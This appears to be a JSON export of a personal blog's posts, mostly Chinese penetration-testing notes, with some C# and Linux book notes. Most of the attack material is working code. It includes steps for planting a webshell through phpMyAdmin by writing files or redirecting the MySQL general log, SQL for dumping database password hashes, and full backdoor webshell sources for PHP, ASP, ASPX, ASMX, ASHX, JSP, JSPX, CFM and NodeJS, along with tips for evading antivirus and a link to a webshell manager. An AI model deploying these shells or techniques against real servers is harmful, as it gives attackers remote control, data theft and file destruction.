max = (int)obj_array[0];    TextBox textbox = (TextBox)obj_array[1];    //TextBox textbox = obj_array[1] as TextBox;    for (int i = 0 ; i &lt; (int)o; i++)    &#123;        textbox.Invoke(new Action(() =&gt;         &#123;            textbox.AppendText(i.ToString());            textbox.AppendText(Environment.NewLine);        &#125;));        //或者以下寫法        //textbox.Invoke(new Action(() =&gt; textbox.AppendText(i.ToString())));        //textbox.Invoke(new Action(() =&gt; textbox.AppendText(Environment.NewLine)));    &#125;&#125;private void button1_Click(object sender, EventArgs e)&#123;    int max = 100;    new Thread(new ParameterizedThreadStart(RunLoop)).Start(new object[]     &#123;        max, textBox1    &#125;);&#125;\n","categories":["Code"],"tags":["Code","C#","Program"]},{"title":"【Tech】[PenTest] phpMyAdmin的getshell方法","url":"/2023/06/12/%E3%80%90Tech%E3%80%91-PenTest-phpmyadmingetshell/","content":"前言在滲透測試中有時可以運氣行好直接登入到phpMyAdmin，下一步我們可以透過getshell進行更深入的滲透，例如像域滲透這種。   \n環境\nWindows 11\nApache + php8.2\nphpMyAdmin\n\n前提需要以下條件\n\nphpMyAdmin最好是root帳號\n知道Absolute Path (本文使用 D:/xampp/htdocs)\n\n實戰Geshell方法phpMyAdmin getshell一般有兩種方法 :  \n\nSQL getshell\n後端 getshell\n\n第一種是使用SQL把webshell寫到伺服器上，第二種是改後端密碼上傳webshell。\nSQL getshell常用方法 - 使用 select into outfile這應該是最常用的方法了，在知道路徑的情況下可以用這招select load_file(&#x27;D:/xampp/htdocs&#x27;);select &#x27;&lt;?php phpinfo();?&gt;&#x27; into outfile &#x27;D:/xampp/htdocs&#x27;;這是最簡單的方法，也是很容易失敗的方法，大部份網頁admin都不是傻的，他們會有設定檔案權限，此時執行SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;\nValue一般會有兩種結果\n\nFolder路徑 : 代表只有該路徑才可以修改\nNULL : 禁止修改\n\nLog寫shellMySQL 5.0以上會自動寫Logs，把執行過的SQL指令都寫進一個.log檔，那如果此時的檔案不是.log而是.php呢?  \n執行以下指令SHOW VARIABLES LIKE &#x27;general%&#x27;;\nset global general_log = &quot;ON&quot;;set global general_log_file=&quot;D:/xampp/htdocs/shell.php&quot;;\n就會在D:/xampp/htdocs 生成一個shell.php然後再select &#x27;&lt;?php @eval($_POST[&#x27;pass&#x27;]); ?&gt;&#x27;就可以getshell了\n技巧最簡單的php一句話木馬&lt;?php @eval($_POST[&#x27;pass&#x27;]); ?&gt;也是最容易被防毒查出來的，如果webshell的code寫得比較多可以把webshell base64加密，再使用php的 base64_decode(); 函數解密。\n注意Log寫webshell的方法動作會很大的，會很容易被發現。另外記得要把一開始的.log檔案記下，不然你會無法還原。\n後端GetShell後端登入\n以wordpress為列子，phpMyAdmin+wordpress是比較容易getshell的，因為wordpress是基於php的，而後端一般都會有檔案修改和上傳等功能。Wordpress登入後端目前還算是很容易的，兩種做法 :   \n\n破解密碼Hash\n在無法破解的情況下直接改密碼\n\n\nWordPress加密後的密碼很上去很亂，但要改也不難，假設你的新密碼是admin，那就把admin以MD5加密，把MD5 Hash換進去就可以了。\n\nGetShell方法一般三種方法   \n\n模版上傳\nPlugin上傳\n直接插入一句話木馬\n\n這種用第三種會比較好，因為前兩種都比較容閉被發現。\n","tags":["pentest","php","phpmyadmin","getshell","webshell"]},{"title":"【Tech】[SQL]SQL注入取得使用者帳號密碼的方法","url":"/2023/06/12/%E3%80%90Tech%E3%80%91-SQL-SQL%E6%B3%A8%E5%85%A5%E5%8F%96%E5%BE%97%E4%BD%BF%E7%94%A8%E8%80%85%E5%B8%B3%E8%99%9F%E5%AF%86%E7%A2%BC%E7%9A%84%E6%96%B9%E6%B3%95/","content":"前言記錄幾個在sql注入中可以把database user, password拿出來的方法\nSQLMapsqlmap.py -u xxx --passwords\nSQL Query//MySQLselect host,user,password from mysql.user;//SQL Server 2022SELECT name, CONVERT(varchar(max), password_hash, 1) AS hashed_password FROM sys.sql_logins"},{"title":"【Tech】一句話木馬","url":"/2023/06/06/%E3%80%90Tech%E3%80%91%E4%B8%80%E5%8F%A5%E8%A9%B1%E6%9C%A8%E9%A6%AC/","content":"甚麼是WebShellWebShell是在滲透測試和入侵時都會用到的工具，是一種後門，需要注意的時WebShell和網頁木馬不一樣，網頁木馬是掛在正常網頁上的木馬程式，當使用者瀏覽網頁時就會下載或執行木馬。WebShell是用來控制一整個網頁伺服器的工具。WebShell有以下三種 :\n\n大馬 : 檔案大，30~70KB以上，加密後會超過100KB。\n小馬 : 檔案小，一般在10KB以下\n指令執行木馬 : 只能簡單地執行的Shell Command.\n一句話木馬 : 功能可超越大馬，容易隱藏和改造。             \n\n\n\n\n一句話木馬在現今的入侵和滲透用的webshell基本上用的都是一句話木馬，大馬的好處是所有執行的Payload都是在localhost上進行，不使用HTTP POST，可以不考慮WAF，但因為檔案太大很容易會被發現，而且不容易寫變種。一句話木馬雖然會因為使用HTTP POST會被WAF檢查，但是很容易寫變種和隱藏，還可以直接寫在正常的檔案內。\n\n一句話木馬客戶端指的是先把對應語言的Payload寫好，再用客戶端發起 POST Request，這樣就會非常方便在大陸以前比較有名的工具叫 中國菜刀，大陸現在比較常用的工具有三個 :\n\n蟻劍\nGodzilla\n冰蝎      \n\n這邊推一下我自己寫的Alienhttps://malbuffer4pt.github.io/Alien\n\n一句話木馬的程式在伺服器沒有裝WAF，Anti-Virus時，只需要用這不到 1KB的程式就可以控制一整台伺服器如下圖 (工具: Alien)\n以php為例，PHP一句話木馬為&lt;?php @eval($_POST[&#x27;pass&#x27;]); ?&gt;$_POST[‘pass’] : 取得HTTP POST參數為pass的Data@eval($str); : 把 $str 以PHP Code執行  , @ 代表如果 $str == null時就不顯示結果(這樣就增加了隱密性。)所以 @eval($_POST[‘pass’]); 就可以把HTTP POST的內容執行, 如 :pass=phpinfo();就可執行phphinfo();  \nASP :&lt;% execute(request(&quot;pass&quot;)) %&gt;\nASPX :&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;])%&gt;\n關於ASMX, ASHX, CFM, JSP, JSPX和NodeJS木馬它們的特點都是沒有「好用」(對攻撃者而言)的eval()函數，或者使用上會比較麻煩…ASMX和ASHX是我在Freebuf上找到的，作者是Ivan，這也有寫進Alien內。而CFM是一個很老的東西了…\nASMX&lt;%@ WebService Language=&quot;JScript&quot; class=&quot;ScriptMethodSpy&quot;%&gt;import System;import System.Web;import System.IO;import System.Web.Servicesimport System.Web.Script.Servicespublic class ScriptMethodSpy extends WebService&#123;          WebMethodAttribute ScriptMethodAttribute function Invoke(Ivan : String) : Void    &#123;            var I = HttpContext.Current;        var Request = I.Request;        var Response = I.Response;        var Server = I.Server;    Response.Write(&quot;&lt;H1&gt;Just for Research Learning, Do Not Abuse It! Written By &lt;a href=&#x27;https://github.com/Ivan1ee&#x27;&gt;Ivan1ee&lt;/a&gt;&lt;/H1&gt;&quot;);        eval(Ivan);    &#125;&#125;\nASHX&lt;%@ WebHandler Language=&quot;JScript&quot;class=&quot; HandlerSpy &quot;%&gt;import System;import System.Web;import System.IO;public class HandlerSpy implements IHttpHandler&#123;   function IHttpHandler.ProcessRequest(context : HttpContext)&#123;           context.Response.Write(&quot;&lt;H1&gt;Just for fun, Do not abuse it!Written by &lt;ahref=&#x27;https://github.com/Ivan1ee&#x27;&gt;Ivan1ee&lt;/a&gt;&lt;/H1&gt; &quot;);           eval(context.Request[&quot;Ivan&quot;]);        &#125;    function get IHttpHandler.IsReusable() : Boolean&#123;            return false;       &#125;&#125;\nJSPJSP目前主要有兩種，菜刀形和冰蝎形菜刀形 :&lt;%@page import=&quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*&quot;%&gt;&lt;%!String Pwd=&quot;sky&quot;;String EC(String s,String c)throws Exception&#123;return s;&#125;//new String(s.getBytes(&quot;ISO-8859-1&quot;),c);&#125;Connection GC(String s)throws Exception&#123;String[] x=s.trim().split(&quot;\\r\\n&quot;);Class.forName(x[0].trim()).newInstance();Connection c=DriverManager.getConnection(x[1].trim());if(x.length&gt;2)&#123;c.setCatalog(x[2].trim());&#125;return c;&#125;void AA(StringBuffer sb)throws Exception&#123;File r[]=File.listRoots();for(int i=0;i&lt;r.length;i++)&#123;sb.append(r[i].toString().substring(0,2));&#125;&#125;void BB(String s,StringBuffer sb)throws Exception&#123;File oF=new File(s),l[]=oF.listFiles();String sT, sQ,sF=&quot;&quot;;java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);for(int i=0;i&lt;l.length;i++)&#123;dt=new java.util.Date(l[i].lastModified());sT=fm.format(dt);sQ=l[i].canRead()?&quot;R&quot;:&quot;&quot;;sQ+=l[i].canWrite()?&quot; W&quot;:&quot;&quot;;if(l[i].isDirectory())&#123;sb.append(l[i].getName()+&quot;/\\t&quot;+sT+&quot;\\t&quot;+l[i].length()+&quot;\\t&quot;+sQ+&quot;\\n&quot;);&#125;else&#123;sF+=l[i].getName()+&quot;\\t&quot;+sT+&quot;\\t&quot;+l[i].length()+&quot;\\t&quot;+sQ+&quot;\\n&quot;;&#125;&#125;sb.append(sF);&#125;void EE(String s)throws Exception&#123;File f=new File(s);if(f.isDirectory())&#123;File x[]=f.listFiles();for(int k=0;k&lt;x.length;k++)&#123;if(!x[k].delete())&#123;EE(x[k].getPath());&#125;&#125;&#125;f.delete();&#125;void FF(String s,HttpServletResponse r)throws Exception&#123;int n;byte[] b=new byte[512];r.reset();ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));os.write((&quot;-&gt;&quot;+&quot;|&quot;).getBytes(),0,3);while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;os.write((&quot;|&quot;+&quot;&lt;-&quot;).getBytes(),0,3);os.close();is.close();&#125;void GG(String s, String d)throws Exception&#123;String h=&quot;0123456789ABCDEF&quot;;int n;File f=new File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0;i&lt;d.length();i+=2)&#123;os.write((h.indexOf(d.charAt(i))&lt;&lt;4|h.indexOf(d.charAt(i+1))));&#125;os.close();&#125;void HH(String s,String d)throws Exception&#123;File sf=new File(s),df=new File(d);if(sf.isDirectory())&#123;if(!df.exists())&#123;df.mkdir();&#125;File z[]=sf.listFiles();for(int j=0;j&lt;z.length;j++)&#123;HH(s+&quot;/&quot;+z[j].getName(),d+&quot;/&quot;+z[j].getName());&#125;&#125;else&#123;FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;is.close();os.close();&#125;&#125;void II(String s,String d)throws Exception&#123;File sf=new File(s),df=new File(d);sf.renameTo(df);&#125;void JJ(String s)throws Exception&#123;File f=new File(s);f.mkdir();&#125;void KK(String s,String t)throws Exception&#123;File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());&#125;void LL(String s, String d)throws Exception&#123;URL u=new URL(s);int n;FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection)u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;os.close();is.close();h.disconnect();&#125;void MM(InputStream is, StringBuffer sb)throws Exception&#123;String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));while((l=br.readLine())!=null)&#123;sb.append(l+&quot;\\r\\n&quot;);&#125;&#125;void NN(String s,StringBuffer sb)throws Exception&#123;Connection c=GC(s);ResultSet r=c.getMetaData().getCatalogs();while(r.next())&#123;sb.append(r.getString(1)+&quot;\\t&quot;);&#125;r.close();c.close();&#125;void OO(String s,StringBuffer sb)throws Exception&#123;Connection c=GC(s);String[] t=&#123;&quot;TABLE&quot;&#125;;ResultSet r=c.getMetaData().getTables (null,null,&quot;%&quot;,t);while(r.next())&#123;sb.append(r.getString(&quot;TABLE_NAME&quot;)+&quot;\\t&quot;);&#125;r.close();c.close();&#125;void PP(String s,StringBuffer sb)throws Exception&#123;String[] x=s.trim().split(&quot;\\r\\n&quot;);Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(&quot;select * from &quot;+x[3]);ResultSetMetaData d=r.getMetaData();for(int i=1;i&lt;=d.getColumnCount();i++)&#123;sb.append(d.getColumnName(i)+&quot; (&quot;+d.getColumnTypeName(i)+&quot;)\\t&quot;);&#125;r.close();m.close();c.close();&#125;void QQ(String cs,String s,String q,StringBuffer sb)throws Exception&#123;int i;Connection c=GC(s);Statement m=c.createStatement(1005,1008);try&#123;ResultSet r=m.executeQuery(q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(i=1;i&lt;=n;i++)&#123;sb.append(d.getColumnName(i)+&quot;\\t|\\t&quot;);&#125;sb.append(&quot;\\r\\n&quot;);while(r.next())&#123;for(i=1;i&lt;=n;i++)&#123;sb.append(EC(r.getString(i),cs)+&quot;\\t|\\t&quot;);&#125;sb.append(&quot;\\r\\n&quot;);&#125;r.close();&#125;catch(Exception e)&#123;sb.append(&quot;Result\\t|\\t\\r\\n&quot;);try&#123;m.executeUpdate(q);sb.append(&quot;Execute Successfully!\\t|\\t\\r\\n&quot;);&#125;catch(Exception ee)&#123;sb.append(ee.toString()+&quot;\\t|\\t\\r\\n&quot;);&#125;&#125;m.close();c.close();&#125;%&gt;&lt;%String cs=request.getParameter(&quot;z0&quot;)+&quot;&quot;;request.setCharacterEncoding(cs);response.setContentType(&quot;text/html;charset=&quot;+cs);String Z=EC(request.getParameter(Pwd)+&quot;&quot;,cs);String z1=EC(request.getParameter(&quot;z1&quot;)+&quot;&quot;,cs);String z2=EC(request.getParameter(&quot;z2&quot;)+&quot;&quot;,cs);StringBuffer sb=new StringBuffer(&quot;&quot;);try&#123;sb.append(&quot;-&gt;&quot;+&quot;|&quot;);if(Z.equals(&quot;A&quot;))&#123;String s=new File(application.getRealPath(request.getRequestURI())).getParent();sb.append(s+&quot;\\t&quot;);if(!s.substring(0,1).equals(&quot;/&quot;))&#123;AA(sb);&#125;&#125;else if(Z.equals(&quot;B&quot;))&#123;BB(z1,sb);&#125;else if(Z.equals(&quot;C&quot;))&#123;String l=&quot;&quot;;BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null)&#123;sb.append(l+&quot;\\r\\n&quot;);&#125;br.close();&#125;else if(Z.equals(&quot;D&quot;))&#123;BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);bw.close();sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;E&quot;))&#123;EE(z1);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;F&quot;))&#123;FF(z1,response);&#125;else if(Z.equals(&quot;G&quot;))&#123;GG(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;H&quot;))&#123;HH(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;I&quot;))&#123;II(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;J&quot;))&#123;JJ(z1);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;K&quot;))&#123;KK(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;L&quot;))&#123;LL(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;M&quot;))&#123;String[] c=&#123;z1.substring(2),z1.substring(0,2),z2&#125;;Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);&#125;else if(Z.equals(&quot;N&quot;))&#123;NN(z1,sb);&#125;else if(Z.equals(&quot;O&quot;))&#123;OO(z1,sb);&#125;else if(Z.equals(&quot;P&quot;))&#123;PP(z1,sb);&#125;else if(Z.equals(&quot;Q&quot;))&#123;QQ(cs,z1,z2,sb);&#125;&#125;catch(Exception e)&#123;sb.append(&quot;ERROR&quot;+&quot;:// &quot;+e.toString());&#125;sb.append(&quot;|&quot;+&quot;&lt;-&quot;);out.print(sb.toString());%&gt;菜刀形就是把所有功能全部寫進一個JSP檔，然後在HTTP POST的時候就會以A, B, C, …, M 執行不同Payload，然面再接上一些參數。\n下面是冰蝎 :&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;)) &#123;  String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/  session.putValue(&quot;u&quot;,k);  Cipher c=Cipher.getInstance(&quot;AES&quot;);  c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));  new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;  %&gt;冰蝎使用的是ClassLoader()，這樣就相當於是一個Eval函數了。\nJSPX&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;&lt;jsp:directive.page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;/&gt;&lt;jsp:declaration&gt; class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;\nCFM&lt;CFSET O=&quot;&quot; /&gt;&lt;CFTRY&gt;&lt;CFSWITCH EXPRESSION=#Form.chopper#&gt;&lt;CFCASE VALUE=&quot;A&quot;&gt;&lt;CFSCRIPT&gt;O=O&amp;Expandpath(&quot;./&quot;)&amp;Chr(9);for(c=65;c lt 91;c=c+1)&#123;if(DirectoryExists(Chr(c)&amp;&quot;:\\&quot;))O=O&amp;Chr(c)&amp;&quot;:&quot;;&#125;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;B&quot;&gt;&lt;CFDIRECTORY DIRECTORY=&quot;#Form.z1#&quot; NAME=&quot;D&quot; SORT=&quot;Type&quot;&gt;&lt;CFLOOP Query=&quot;D&quot;&gt;&lt;CFSCRIPT&gt;O=O&amp;D.Name;If(D.Type eq &quot;Dir&quot;)O=O&amp;&quot;/&quot;;O=O&amp;Chr(9)&amp;DateFormat(D.DateLastModified,&quot;yyyy-mm-dd&quot;)&amp;TimeFormat(D.DateLastModified,&quot; HH:MM:ss&quot;)&amp;Chr(9)&amp;D.Size&amp;Chr(9);If(Left(Form.z1,1) eq &quot;/&quot;)&#123;O=O&amp;D.Mode;&#125;else&#123;O=O&amp;D.Attributes;&#125;O=O&amp;Chr(10);&lt;/CFSCRIPT&gt;&lt;/CFLOOP&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;C&quot;&gt;&lt;CFFILE ACTION=&quot;Read&quot; FILE=&quot;#Form.z1#&quot; VARIABLE=&quot;O&quot;&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;D&quot;&gt;&lt;CFFILE ACTION=&quot;Write&quot; FILE=&quot;#Form.z1#&quot; OUTPUT=&quot;#Form.z2#&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;E&quot;&gt;&lt;CFSCRIPT&gt;Function DF(P)&#123;F=CreateObject(&quot;java&quot;,&quot;java.io.File&quot;).init(P);L=0;i=0;if(F.isDirectory())&#123;L=F.listFiles();for(i=1;i lte ArrayLen(L);i=i+1)&#123;if(not L[i].delete())&#123;DF(L[i].getPath());&#125;&#125;&#125;F.delete();&#125;DF(Form.z1);O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;F&quot;&gt;&lt;cffile action=&quot;readbinary&quot; file=&quot;#Form.z1#&quot; variable=&quot;B&quot; /&gt;&lt;cfset J=CreateObject(&quot;java&quot;,&quot;java.nio.ByteBuffer&quot;) /&gt;&lt;cfset X=J.Allocate(JavaCast( &quot;int&quot;, ArrayLen(B)+6)) /&gt;&lt;cfset X.Put(ToBinary(ToBase64(&quot;-&gt;&quot;&amp;&quot;|&quot;)), JavaCast(&quot;int&quot;,0), 3 ) /&gt;&lt;cfset X.Put(B, JavaCast(&quot;int&quot;,0), JavaCast(&quot;int&quot;,ArrayLen(B)) ) /&gt;&lt;cfset X.Put(ToBinary(ToBase64(&quot;|&quot;&amp;&quot;&lt;-&quot;)), JavaCast(&quot;int&quot;,0), 3 ) /&gt;&lt;CFCONTENT Type=&quot;application/octet-stream&quot; Variable=&quot;#X.Array()#&quot;&gt;&lt;CFABORT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;G&quot;&gt;&lt;CFSCRIPT&gt;F=CreateObject(&quot;java&quot;,&quot;java.io.FileOutputStream&quot;);F.init(Form.z1);h=&quot;0123456789ABCDEF&quot;;C=Form.z2;for(i=0;i lt Len(C);i=i+2)&#123;F.write(BitOr(BitSHLN(h.indexOf(C.charAt(i)),4),h.indexOf(C.charAt(i+1))));&#125;F.close();O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;H&quot;&gt;&lt;CFFUNCTION Name=&quot;cpf&quot;&gt;&lt;CFARGUMENT Name=&quot;S&quot;&gt;&lt;CFARGUMENT Name=&quot;D&quot;&gt;&lt;CFFILE ACTION=&quot;Copy&quot; SOURCE=&quot;#S#&quot; DESTINATION=&quot;#D#&quot;&gt;&lt;/CFFUNCTION&gt;&lt;CFSCRIPT&gt;Function CP(S,D)&#123;sf=CreateObject(&quot;java&quot;,&quot;java.io.File&quot;).init(S);df=CreateObject(&quot;java&quot;,&quot;java.io.File&quot;).init(D);L=0;i=0;if(sf.isDirectory())&#123;if(not df.exists())&#123;df.mkdir();&#125;L=sf.listFiles();for(i=1;i lte ArrayLen(L);i=i+1)&#123;if(L[i].isDirectory())&#123;CP(L[i].getPath(),df.getPath()&amp;&quot;/&quot;&amp;L[i].getName());&#125;else&#123;cpf(L[i].getPath(),df.getPath()&amp;&quot;/&quot;&amp;L[i].getName());&#125;&#125;&#125;else&#123;cpf(S,D);&#125;&#125;CP(Form.z1,Form.z2);O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;I&quot;&gt;&lt;CFFILE ACTION=&quot;MOVE&quot; SOURCE=&quot;#Form.z1#&quot; DESTINATION=&quot;#Form.z2#&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;J&quot;&gt;&lt;CFDIRECTORY Directory=&quot;#Form.z1#&quot; Action=&quot;Create&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;K&quot;&gt;&lt;CFSCRIPT&gt;FileSetLastModified(Form.z1,ParseDateTime(Form.z2));O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;L&quot;&gt;&lt;CFSCRIPT&gt;Z=Form.z2;For(i=Len(Z);i gt 0;i=i-1)&#123;if(Mid(Z,i,1) eq &quot;/&quot; Or Mid(Z,i,1) eq &quot;\\&quot;)&#123;Break;&#125;&#125;P=Left(Z,i);F=Mid(Z,i+1,256);&lt;/CFSCRIPT&gt;&lt;CFHTTP METHOD=&quot;Get&quot; URL=&quot;#Form.z1#&quot; PATH=&quot;#P#&quot; FILE=&quot;#F#&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;M&quot;&gt;&lt;CFEXECUTE Name=&quot;#Mid(Form.z1,3,Len(Form.z1)-2)#&quot; Arguments=&quot;#Mid(Form.z1,1,2)# #Form.z2#&quot; Variable=&quot;O&quot; TimeOut=&quot;60&quot; /&gt;&lt;/CFCASE&gt;&lt;/CFSWITCH&gt;&lt;CFCATCH Type=&quot;Any&quot;&gt;&lt;CFSET O=&quot;ERROR:// &quot;&amp;CFCatch.Message /&gt;&lt;/CFCATCH&gt;&lt;/CFTRY&gt;&lt;CFOUTPUT&gt;-&gt;#Chr(124)&amp;O&amp;Chr(124)#&lt;-&lt;/CFOUTPUT&gt;\n菜刀形，跟上面的JSP一樣。\nNodeJSvar http = require(&#x27;http&#x27;),\turl = require(&#x27;url&#x27;),    exec = require(&#x27;child_process&#x27;).exec;var querystring = require(&#x27;querystring&#x27;);var host = &quot;127.0.0.1&quot;,    port = &quot;5555&quot;,    thisServerUrl = &quot;http://&quot; + host + &quot;:&quot; + port;http.createServer(function (req, res) &#123;  req.addListener(&#x27;end&#x27;, function () &#123;  &#125;);  //var parsedUrl = url.parse(req.url, true);  //var cmd = parsedUrl.query[&#x27;cmd&#x27;];  var string = &#x27;&#x27;;        req.addListener(&#x27;data&#x27;, function(chunk)&#123;            string += chunk;        &#125;);\tvar cmd;\treq.addListener(&#x27;end&#x27;, function()&#123;      var strObj = querystring.parse(string);\t\t  cmd = strObj.pass;\t\t  res.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/plain&#x27;&#125;);      if (cmd) &#123;        try &#123;eval(cmd);&#125; catch(e) &#123;console.log(&quot;ERROR://&quot; + e);res.end(&quot;ERROR://&quot;);&#125;      &#125; else &#123;\t\t  res.end();\t  &#125;  &#125;);&#125;).listen(port, host);console.log(&#x27;Server running at &#x27; + thisServerUrl );\nNodeJS的木馬在滲透測試中不見得能用上，因為使用條件跟php, asp, aspx這些比較過於苛刻。\n\n","categories":["Code"],"tags":["Code","pentest","webshell","trojan","backdoor"]},{"title":"【Tool】Alien","url":"/2023/06/06/%E3%80%90Tool%E3%80%91Alien/","content":"簡介Alien是一個用C#編寫的一句話木馬管理工具，功能如下 :  \n\nSystem Information\nFileManager (可顯示圖片)\nVirtual Terminal\nDatabase\nRegistry\nMonitor\nScreenshot\n\n可控伺服器(可使用功能不一致)Windows/Linux/Unix/MacOS\nDatabase\nMySQL : PHP\nSQL Server : ASP, ASPX, ASMX, ASHX\n\n文檔&amp;下載\n\n\n\nID\n主題\nUrl\n\n\n\n\n1\nAlien文檔\nhttps://malbuffer4pt.github.io/Alien\n\n\n2\nAlien Github\nhttps://github.com/malbuffer4pt/Alien\n\n\n\n\n","categories":["Tools"],"tags":["pentest","webshell","backdoor","Alien","工具"]},{"title":"[Book] Designing Anonymous Communication Chains for Offensive and Defensive Cybersecurity","url":"/2026/01/14/2026-1-14-BookDesigningAnonymousCommChains/","content":"El libro\n\n\nIntroductionReflection"},{"title":"[Book] How Linux Works - WHAT EVERY SUPERUSER SHOULD KNOW","url":"/2026/01/14/2026-1-14-BookLinuxSuperUser/","content":"El Libro\n\n\nIntroductionReflection"},{"title":"[Book] Practical Linux Forenics","url":"/2026/01/14/2026-1-14-BookPracticalLinuxForensics/","content":"El libro\n\n\nIntroduction"},{"title":"[Book] The Linux Command Line (2nd Edition)","url":"/2026/01/14/2026-1-14-BookLinuxCommand/","content":"El libro\n\n\nIntroductionThis article is used to keep notes and summaries of the book “The Linux Command Line (3rd Edition)”.The content will be continuously updated as I read through the book.\nReflectionChapter 4 - Manipulating Files and Directoriescp -u *.html destination\nWildcards\n\n\n\nWildcard\nMeaning\n\n\n\n\n*\nMatches any characters\n\n\n?\nMatches any single character\n\n\n[characters]\nMatches any character that is a member if the set characters\n\n\n[!characters]\nMatches any character that is not a member of the set characters\n\n\n[[:class:]]\nMatches any character that is a member of the specified class\n\n\n\n\nCommonly Used Character Classes\n\n\n\nCharacter class\nMeaning\n\n\n\n\n[:alnum:]\nMatches any alphanumeric character\n\n\n[:alpha:]\nMatches any alphabetic character\n\n\n[:digit:]\nMatches any numeral\n\n\n[:lower:]\nMatches any lowercase letter\n\n\n[:upper:]\nMatches any uppercase letter\n\n\n\n\n\n\n\n\nPattern\nMatches\n\n\n\n\n*\nAll files\n\n\ng*\nAny file beginning with g\n\n\nb*.txt\nAny file beginning with b followed by any characters and ending with .txt\n\n\nData???\nAny file beginning with Data followed by exactly three characters\n\n\n[abc]*\nAny file beginning with either an a, a b, or a c\n\n\nBACKUP.[0-9][0-9][0-9]\nAny file beginning with BACKUP. followed by exactly three numerals\n\n\n[[:upper:]]*\nAny file beginning with an uppercase letter\n\n\n[![:digit:]]*\nAny file not beginning with a numeral\n\n\n*[[:lower:]123]\nAny file ending with a lowercase letter or the numerals 1, 2, or 3\n\n\n\n\nmkdirmkdir dir1 dir2 dir3\ncpcp item... directory\nUseful options and Examples:\n\n\n\n\nOption\nMeaning\n\n\n\n\n-a, --archive\nCopy the files and directories and all of their attributes, including ownerships and permissions. Normally, copies take on the default attributes of the user performing the copy.\n\n\n-i, --interactive\nBefore overwriting an existing file, prompt the user for confirmation. If this option is not specified, cp will silently overwrite files.\n\n\n-r, --recursive\nRecursively copy directories and their contents. This option (or the 